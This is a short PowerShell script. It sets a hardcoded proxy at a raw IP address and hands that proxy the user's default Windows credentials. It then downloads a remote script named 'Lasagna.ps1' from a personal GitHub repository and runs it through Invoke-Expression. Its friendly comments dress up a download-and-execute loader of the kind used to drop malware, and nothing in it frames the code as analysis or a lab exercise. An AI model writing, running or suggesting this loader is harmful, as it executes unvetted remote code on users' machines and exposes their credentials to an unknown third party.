# Set the HTTP proxy server information (replace with your proxy server details)
$proxyServer = "http://43.157.8.79:8888"

# Set the URL of the script you want to execute
$scriptURL = "https://raw.githubusercontent.com/MarkDenkmn/MarkDenkmn/main/Lasagna.ps1"

# Create a proxy object
$proxy = New-Object System.Net.WebProxy($proxyServer)

# Set the proxy settings for the current session
[system.net.webrequest]::defaultwebproxy = $proxy
[system.net.webrequest]::defaultwebproxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials

# Download and execute the script from the specified URL
try {
    $scriptContent = Invoke-WebRequest -Uri $scriptURL -Proxy $proxyServer -UseBasicParsing
    Invoke-Expression -Command $scriptContent.Content
} catch {
    Write-Host "Error executing the script: $_"
}

# Remove the proxy settings to avoid affecting other PowerShell sessions
[system.net.webrequest]::defaultwebproxy = $null
